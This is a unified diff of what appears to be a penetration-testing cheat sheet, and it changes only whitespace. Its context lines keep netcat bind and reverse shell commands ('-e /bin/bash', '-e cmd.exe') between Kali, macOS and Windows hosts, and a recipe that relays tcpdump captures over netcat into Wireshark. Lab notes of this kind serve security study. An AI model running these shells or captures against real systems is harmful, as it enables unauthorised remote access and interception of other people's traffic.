@@ -4,14 +4,14 @@ Kali:
 
 	nc MACOS/Windows-IP 8888  -e /bin/bash (connect)
 	nc  -lvvp 8888 -e /bin/bash (listen)
-	
+
 MacOS:
 
 	nc KALI-IP 8888 (connect - cannot execute -e directly)
     nc -l 8888 (listen - cannot execute -e directly)
- 
+
 Windows:
- 
+
 	nc KALI-IP 8888 -e cmd.exe (connect)
 	nc  -lvvp 8888 -e cmd.exe (listen)
 
@@ -39,9 +39,9 @@ Sniff traffic from a mac with netcat (default on macos) and use tcpdump (default
 	nc -l -p 7777 | tee /tmp/sniffed_output.pcapng (on kali)
 
 Data in real time:
- 
+
 On kali:
- 
+
 	mkfifo /tmp/wiretap
 	nc -l -p 9999 > /tmp/wiretap
 	wireshark -k -i /tmp/wiretap
